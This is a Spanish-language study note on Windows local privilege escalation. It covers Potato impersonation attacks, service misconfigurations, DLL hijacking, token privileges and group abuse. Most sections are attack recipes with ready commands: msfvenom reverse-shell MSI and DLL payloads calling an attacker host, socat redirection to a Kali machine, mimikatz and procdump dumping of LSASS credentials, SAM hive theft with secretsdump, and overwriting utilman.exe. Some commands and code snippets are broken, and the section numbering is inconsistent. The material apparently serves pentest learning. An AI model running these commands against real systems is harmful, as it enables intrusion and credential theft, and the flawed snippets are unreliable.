# Índice

[[Windows; Escalada de privilegios#1. 🥔 Ataques Potato e Impersonación]]
- [[Windows; Escalada de privilegios#1.1. JuicyPotato (2018) - Windows 2007 - 2016]]
- [[Windows; Escalada de privilegios#1.2. GodPotato (2023) - Windows actual]]
- [[Windows; Escalada de privilegios#1.3 PrintSpoofer (2020)]]

[[Windows; Escalada de privilegios#2. ⚙️ Vulnerabilidades en Servicios]]
- [[Windows; Escalada de privilegios#2.1. Permisos débiles en el ejecutable del servicio]]
- [[Windows; Escalada de privilegios#2.2. Unquoted service path]]
- [[Windows; Escalada de privilegios#2.3. Autoruns]]
- [[Windows; Escalada de privilegios#2.4. AlwaysInstallElevated]]
- [[Windows; Escalada de privilegios#2.5. DLL Hijacking]]

[[Windows; Escalada de privilegios#3. 🔑 Abuso de Privilegios del Token]]
- [[Windows; Escalada de privilegios#3.1. SeDebugPrivilege]]
- [[Windows; Escalada de privilegios#3.2. SeBackupPrivilege]]
- [[Windows; Escalada de privilegios#3.3. SeRestorePrivilege]]
- [[Windows; Escalada de privilegios#3.4. SeTakeOwnershipPrivilege]]
- [[Windows; Escalada de privilegios#3.5. SeLoadDriverPrivilege]]

[[Windows; Escalada de privilegios#4. 👥 Abuso de Grupos]]
- [[Windows; Escalada de privilegios#4.1. Remote Management Users (WinRM)]]
- [[Windows; Escalada de privilegios#4.2. DnsAdmins]]
- [[Windows; Escalada de privilegios#4.3. Event Log Readers]]

[[Windows; Escalada de privilegios#5. 🔍 Enumeración inicial — ¿Por dónde empezar?]]


> [!abstract] Introducción 
> La escalada de privilegios local (LPE) consiste en pasar de un usuario con bajos permisos a uno con más, típicamente **SYSTEM** o **Administrador**. Las vías principales son: abusar de privilegios del token, explotar servicios mal configurados, abusar de la pertenencia a ciertos grupos y explotar vulnerabilidades del sistema.

---

# 1. 🥔 Ataques Potato e Impersonación

> [!info] Fundamento común
>  Las cuentas de servicio como `IIS AppPool\DefaultAppPool` o `NT SERVICE\MSSQLSERVER` tienen `SeImpersonatePrivilege` por diseño. Este privilegio permite a un proceso **usar el token de otro usuario** que se conecte a él. 
>  
>  En los ataques Potato, el atacante manda crear un objeto COM privilegiado, que expone métodos por RPC/DCOM. Al invocar uno de esos métodos, el servicio COM se autentica via NTLM y responde, pero el atacante lo redirige  a una named pipe propia (o listener RPC/local). Gracias a la impersonación, el atacante consigue un token de SYSTEM y lo aprovecha para lanzar un proceso privilegiado

> [!warning] Preparación del escenario vulnerable
Somos administrador. Podemos darle al atacante una shell desde una cuenta de servicio para que tenga este privilegio:
`PsExec.py -i -u "nt authority\local service" C:\Temp\reverse.exe`

> [!tip] ¿Cuál usar?
```
¿Server 2019 o superior? → GodPotato o PrintSpoofer
¿Server 2016 o inferior? → JuicyPotato
¿Sin spooler activo?     → GodPotato
```

## 1.1. JuicyPotato (2018) - Windows 2007 - 2016

En este ataque, el atacante busca CLSIDs que puedan ser activados por DCOM, se ejecuten como **SYSTEM** y soporten impersonación mediante RPC. Luego fuerza la creación de un objeto con ese CLSID a través de DCOM y al hacerlo SYSTEM conecta al named pipe del atacante (RPC) y este captura su token con la impersonación.

Con este token puede crear un proceso como la cmd como SYSTEM

> [!error]+ Ataque
El atacante sube a la máquina el programa `JuicyPotato.exe`
```
.\jp.exe -t * -p C:\windows\system32\cmd.exe -a "/c net user Administrator 12345678" -l 9001
```
- Si falla, puede que con el parámetro `-c` tengamos que indicar un CLSID porque el que prueba de por sí está mal, lo podemos obtener de [aqui](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
 

> [!success]+ Mitigación
La vulnerabilidad fue parcheada a partir de Server 2019

## 1.2. RoguePotato (2020) - Windows server 2019

Mejora de JuicyPotato para sistemas donde no hay CLSIDs locales explotables (Windows server 2019). 
Manda la respuesta del metodo DCOM hacia el kali atacante que actua como servidor falso. Este redirige esta respuesta de vuelta al equipo local mediante un Named Pipe, dónde se captura el token con el `SeImpersonatePrivilege`, evitando así las restricciones de CLSIDs.

> [!error]+ Ataque
Primero hay que  redirigir el puerto 135 de kali al puerto 9999 del windows victima (el por defecto del exploit)
```
Kali: sudo socat tcp-listen:135,reuseaddr,fork tcp:<ip_windows>:9999
Windows: .\RoguePotato.exe -r <kali_ip> -e "<command>" -l 9999
```
 

## 1.3 PrintSpoofer (2020)

Abusa del Printer Bug (`MS-RPRN`) para forzar a SYSTEM a conectarse a un Named Pipe controlado. Crea una named pipe `\\.\pipe\atacante\pipe\spoolss` y fuerza al spooler de impresión a conectarse a este pipe mediante una llamada a la API (`RpcRemoteFindFirstPrinterChangeNotification`). Como el spooler corre como SYSTEM, captura su token via impersonación

> [!error]+ Ataque
Primero hay que  redirigir el puerto 135 de kali al puerto 9999 del windows victima (el por defecto del exploit)
```
PrintSpoofer.exe -c "<comando>"
```
 

## 1.2. GodPotato (2023) - Windows actual

Abusa de la interfaz **IMarshal** de COM para forzar a SYSTEM a conectar a un pipe controlado, sin depender de CLSIDs específicos ni del spooler. Funciona en prácticamente todas las versiones modernas.

> [!error]+ Ataque
Para explotarlo se descarga la herramienta [godpotato](https://github.com/BeichenDream/GodPotato/releases). ¿Para qué version? Esto se ve en el registro `reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"` . Luego se ejecuta el exploit `GodPotato.exe -cmd "<comando>"`
 
---

# 2. ⚙️ Vulnerabilidades en Servicios

Para ver los permisos que tenemos sobre los servicios podemos usar `\accesschk.exe -uwcqv <nuestro_usuario> * /accepteula`. Luego con `cmd /c "sc qc <servicio>"` vemos los detalles del servicio, como el ejecutable que lanza o la cuenta de servicio que lo corre.

## 2.1. Permisos débiles en el ejecutable del servicio

Si el ejecutable que lanza un servicio tiene permisos de escritura para usuarios no privilegiados, se puede sustituir por uno malicioso. Al reiniciar el servicio (o el sistema), el código del atacante corre con los privilegios de la cuenta del servicio.

> [!error]+ Ataque: Insecure Service Permissions
Verificamos los permisos del servicio, para buscar por `SERVICE_ALL_ACCESS` o `SERVICE_CHANGE_CONFIG` y miramos la ruta del ejecutable
`.\accesschk64.exe /accepteula -uwcqv <servicio>`
 
Luego paramos el servicio, cambiamos la ruta del ejecutable y lo volvemos a arrancar
```powershell
net stop <servicio>
sc config <servicio> binpath= "<malware>"
net start <servicio>
```
- Otra alternativa es sobrescribir el binario `copy <malware> <ruta_ejecutable> /Y`

> [!error]+ Ataque: Insecure executable path
Verificamos la ruta del ejecutable con `icacls`. Si tenemos permisos, podemos sobrescribir el ejecutable con nuestro binario: `copy <malware> <ruta_ejecutable> /Y`

> [!error]+ Ataque: Insecure Registry Key
Podemos cambiarlo desde el registro si tenemos acceso. Primero vemos las claves a las que podemos acceder 
`accesschk64.exe /accepteula <usuario> -kvuqsw hklm\System\CurrentControlSet\services`

Luego lo modificamos:
`reg add HKLM\SYSTEM\CurrentControlSet\services\<servicio> /v ImagePath /t REG_EXPAND_SZ /d <ruta> /f`

## 2.2. Unquoted service path
 
Cuando la ruta del ejecutable de un servicio contiene espacios y **no está entre comillas**, Windows la interpreta de forma ambigua. Prueba las siguientes rutas en orden hasta encontrar un ejecutable:
```
Ruta correcta:     C:\Program Files\Mi Servicio\app.exe
Orden de búsqueda: C:\Program.exe > C:\Program Files\Mi.exe > C:\Program Files\Mi Servicio\app.exe
```

> [!warning]+ Encontrar servicios sin comillas
CMD `wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """`
Powershell `gwmi Win32_Service | ? { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } | select Name, PathName, StartMode, StartName

> [!error]+ Ataque: Insecure executable path
Por tanto el atacante puede enumerar a `C:\Program Files\` y subir el malware como `Mi.exe` . Al reiniciar el servicio, Windows ejecuta `Mi.exe` antes de llegar al binario real.

## 2.3. Autoruns

Un autorun es un programa que se ejecuta automáticamente al iniciar el sistema. Esto es porque lo define el registro de Windows con la clave:

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

> [!warning]+ config vulnerable
Creamos un servicio vulnerable que se ejecute automáticamente
```powershell
copy C:\Windows\System32\calc.exe C:\Program Files\Autoruns\calc.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Vuln /t REG_SZ /d C:\Program Files\Autoruns\calc.exe /f
```
 
> [!error]+ Ataque
1. Consultamos los autoruns `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
2. vemos su ejecutable. Si tenemos permisos lo sustituimos por el nuestro: `copy <malware> <ruta_ejecutable> /Y`
3. Al reiniciar el sistema se ejecutará nuestro malware

## 2.4. AlwaysInstallElevated

Si estas dos claves del registro están a `1`, cualquier usuario puede instalar paquetes `.msi` con privilegios de **SYSTEM**, independientemente de sus permisos.

```
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer → AlwaysInstallElevated = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer → AlwaysInstallElevated = 1
```

[!error] Ataque
1. Verificamos las dos claves del registro, tanto bajo la raiz HCKU como la raiz HKLM  
`reg query <raiz>\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
2. Luego generamos un payload MSI con msfvenom
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<puerto> -f msi -o shell.msi`
3. Y lo instalamos como usuario normal, pero se ejecutará como system `msiexec /quiet /qn /i shell.msi`

## 2.5. DLL Hijacking

Cuando un proceso busca una DLL, Windows la busca en este orden:

```
[Carpeta del ejecutable] > [C:\Windows\System32\] > [C:\Windows\System\] > [C:\Windows\] > [carpeta actual] > [%PATH%]
```

- Si el atacante puede escribir en alguna ruta que se consulta **antes** de donde está la DLL real, puede plantar una DLL maliciosa que se cargará en el proceso.
- Si se ve que se llama a una DLL que no existe, como `test.dll`, se puede crear una maliciosa con ese nombre

> [!error]+ Ataque
La DLL maliciosa
- **DllMain**, es el punto de entrada que se llama cuando se carga y descarga la DLL, ul_reason_for_call indica por qué se llamó a DllMain.
```c
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain( HMODULE h, DWORD r, LPVOID l ) { if(r==DLL_PROCESS_ATTACH): system("whoami"); return 1; }
```
> O sin system:
```c
DWORD WINAPI t(LPVOID p){ system("whoami > C:\\Temp"); return 0; }  
BOOL WINAPI DllMain(HMODULE h,DWORD r,LPVOID l){ if(r==1) CreateThread(0,0,t,0,0,0); return 1; }
```
- Con metasploit `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<puerto> -f dll -o evil.dll`
Por tanto la compilamos `x86_64-w64-mingw32-gcc WTF.cpp --shared -o test.DLL`

---
# 3. 🔑 Abuso de Privilegios del Token

Cuando se tiene acceso a un token con ciertos privilegios habilitados, se pueden usar directamente para escalar. 
Ver qué privilegios tiene el usuario actual: `whoami /priv`

## 3.1. SeDebugPrivilege

Permite abrir cualquier proceso con acceso total a su memoria, independientemente de sus permisos. Con esto se puede inyectar código en `lsass.exe` o en cualquier proceso SYSTEM.

> [!error]+ Ataque
Con este privilegio podemos aaceder a la SAM volcando la memoria de LSASS
```powershell
.\mimikatz.exe "sekurlsa::logonpasswords" exit     # obtener contraseñas directamente
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" exit # volcar lsass con mimikatz
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp # volcar lsass con procdump
```

## 3.2. SeBackupPrivilege

Permite leer cualquier archivo ignorando sus ACLs, como si se estuviera haciendo un backup. Con esto se puede leer la SAM, el SYSTEM hive y el NTDS.dit.

> [!error]+ Ataque
Tenemos que clonar este [repositorio](https://github.com/giuliano108/SeBackupPrivilege) y subirlo a la máquina para habilitar el privilegio en la sesión actual y copiar los hives
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Set-SeBackupPrivilege # Habilitar el privilegio en la sesión actual
 
reg save HKLM\system system & reg save HKLM\sam sam # Copiar las hives
diskshadow.exe /s script.dsh   # O crear shadow copy (más robusto)
robocopy /b E:\Windows\System32\config\ . SAM SYSTEM
 
impacket-secretsdump.py -system system -sam -sam LOCAl  # Acceder al registrp
```

## 3.3. SeRestorePrivilege

Permite escribir en cualquier archivo ignorando sus ACLs. Se puede usar para sobrescribir ejecutables del sistema o archivos de configuración.

> [!error]+ Ataque
En este caso sobrescribimos un binario del sistema con un payload
`Copy-FileSeRestorePrivilege .\payload.exe C:\Windows\System32\utilman.exe`

## 3.4. SeTakeOwnershipPrivilege

Permite apropiarse de cualquier objeto del sistema (archivo, clave de registro, servicio...) convirtiéndose en su propietario, y luego modificar su DACL para darse permisos.

> [!error]+ Ataque
En este caso sobrescribimos un binario del sistema con un payload
```powershell
takeown /f C:\Windows\System32\archivo.exe # Tomar posesión de un archivo
icacls C:\Windows\System32\archivo.exe /grant %username%:F # Dar permisos completos sobre él
```

## 3.5. SeLoadDriverPrivilege

Permite cargar drivers en el kernel. Si se puede cargar un driver malicioso o vulnerable, se tiene ejecución de código en modo kernel (ring 0).

```powershell
# Cargar driver vulnerable conocido (ej: Capcom.sys)
# y usarlo para ejecutar código en ring 0
.\DriverLoader.exe Capcom.sys
.\ExploitCapcom.exe
```

---
# 4. 👥 Abuso de Grupos

Ciertos grupos de Windows tienen capacidades especiales que, bien abusadas, permiten escalar privilegios sin necesitar un exploit.
- **Backup Operators**: Tienen  `SeBackupPrivilege` y `SeRestorePrivilege`.
- **Server operators**: Pueden iniciar y detener servicios, y modificar su configuración en un Domain Controller
- **Remote Desktop Users**: Pueden conectarse por RDP 

## 4.1. Remote Management Users (WinRM)

Permiten conectarse via WinRM/PowerShell Remoting. Útil para movimiento lateral sin necesidad de RDP.
```powershell
Enter-PSSession -ComputerName <objetivo> -Credential <usuario>
Invoke-Command -ComputerName <objetivo> -ScriptBlock { whoami }
```

## 4.2. DnsAdmins

Pueden cargar un plugin DLL en el servicio DNS (`dns.exe`), que corre como SYSTEM en el DC.

> [!Error] Ataque

1. Se crea la DLL maliciosa: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<puerto> -f dll -o plugin.dll`
2. Se configura esa dll como plugin `dnscmd <DC> /config /serverlevelplugindll \\<share>\plugin.dll`
3. Se reinicia el servicio DNS 

## 4.3. Event Log Readers

Pueden leer los logs de seguridad. Aunque no es escalada directa, puede revelar credenciales en texto claro en logs de PowerShell, comandos ejecutados, o patrones de autenticación.
 - Puede buscar credenciales en logs de powershell
`Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | ? { $_.Message -match "password|pass|cred" }`

 - O enumerar usuarios válidos con logins fallidos (4625)
`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | Select-Object -First 20`

---

# 5. 🔍 Enumeración inicial — ¿Por dónde empezar?

powershell
> [!tip] Herramientas automáticas de enumeración
En lugar de lanzar los comandos uno a uno, estas herramientas automatizan toda la enumeración:
- **WinPEAS** — enumeración exhaustiva, colorea los hallazgos por criticidad
- **PowerUp** (PowerSploit) — enfocado en configuraciones incorrectas de servicios y privilegios
- **Seatbelt** — recopila información del sistema orientada a seguridad ofensiva
- **SharpUp** — versión de PowerUp compilada en C#

---

## 🔗 Ver también

- [[Windows; Procesos, redes y servicios]]
- [[Windows; gestión de identidades]]
- [[Windows; sistema de ficheros y permisos]]
- [[Windows; Configuraciones]]
- [[Active Directory]]
